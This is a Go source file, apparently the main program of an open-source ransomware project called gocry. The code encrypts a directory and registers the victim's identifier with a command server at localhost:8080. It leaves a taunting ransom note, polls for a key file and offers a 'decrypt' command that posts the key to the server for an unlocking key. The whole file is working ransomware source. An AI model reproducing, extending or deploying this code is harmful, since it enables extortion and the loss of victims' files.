package main

import (
	"bufio"
	"bytes"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/nireo/gocry/crypt"
	"github.com/nireo/gocry/ransomware"
	"github.com/nireo/gocry/victim"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/exp/errors/fmt"
)

var rootToEncrypt string = "./test"

const message string = `
Hello, you've been infected by gocry. Your files have been encrypted using military grade encryption >:D.
Do not use any decryption software or change the files, otherwise they might be lost forever.

How to decrypt:
Place the correct key.txt into the decrypted root folder.
`

func main() {
	rw, err := ransomware.NewRansomware(rootToEncrypt)
	if err != nil {
		log.Fatalf("error creating a ransomware instance: %s", err)
	}

	crypt.EncryptRoot(rw.RootDir, rw.Key)
	rw.WriteKeyFile()

	uindef, err := uuid.NewV4()
	if err != nil {
		log.Fatalf("error creating an unique indentifier: %s", err)
	}

	victimIndentifier := victim.NewVictimIndentifer()
	victimIndentifier.IP = "127.0.0.1"
	victimIndentifier.SendToServer("http://localhost:8080/register")

	rw.CreateRansomInfoFile(message)

	// Start an infnite loop which checks key validity. We start in a goroutine, since
	// we want the user to be able to interact with the ransomware.
	go func() {
		for {
			fmt.Println()
			fmt.Println("Checking key file...")
			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
			if err != nil {
				time.Sleep(time.Minute * 3)
				continue
			}

			// check if the keys match
			if bytes.Equal(key, rw.Key) {
				// The ransom has been paid so decrypt the files..
				crypt.DecryptRoot(rw.RootDir, rw.Key)
				fmt.Println("Thank you for your cooperation!")

				// remove the key and the ransom files.
				if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
					log.Fatalf("error removing key file: %s", err)
				}

				if err := os.Remove(rw.RootDir + "/ransom.txt"); err != nil {
					log.Fatalf("error removing ransom file: %s", err)
				}
				break
			}
			fmt.Println("Key did not match, checking again in 3 minutes...")

			time.Sleep(time.Minute * 3)
		}
	}()

	fmt.Println("You can find commands to interact with gocry by typing: commands")

	reader := bufio.NewReader(os.Stdin)
	for {
		text, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("error reading your command, please try again!")
			continue
		}
		text = strings.Replace(text, "\n", "", -1)
		if text == "commands" {
			fmt.Println("'commands' - displays all of the commands available.")
			fmt.Println("'uuid' - display your unique indentifer used to pay your ransomware.")
		} else if text == "uuid" {
			fmt.Println(uindef)
		} else if text == "decrypt" {
			// send the key to the database and get the decrypted key using the private rsa key from the server.
			key, err := ioutil.ReadFile(rw.RootDir + "/key.txt")
			if err != nil {
				log.Fatalf("error reading key file: %s", err)
			}

			req, err := http.NewRequest("POST", "http://localhost:8080/decrypt_key", bytes.NewBuffer(key))
			if err != nil {
				log.Fatalf("error with decrypt request: %s", err)
			}

			cl := http.Client{}
			res, err := cl.Do(req)
			if err != nil {
				log.Fatalf("error getting decrypt key")
			}
			defer res.Body.Close()

			deckey, err := ioutil.ReadAll(res.Body)
			if err != nil {
				log.Fatalf("error reading decrypted key: %s", err)
			}

			// remove the old key file
			if err := os.Remove(rw.RootDir + "/key.txt"); err != nil {
				log.Fatalf("error removing old key file: %s", err)
			}

			if err := ioutil.WriteFile(rw.RootDir+"/key.txt", deckey, 0600); err != nil {
				log.Fatalf("write output: %s", err)
			}
		}
	}
}
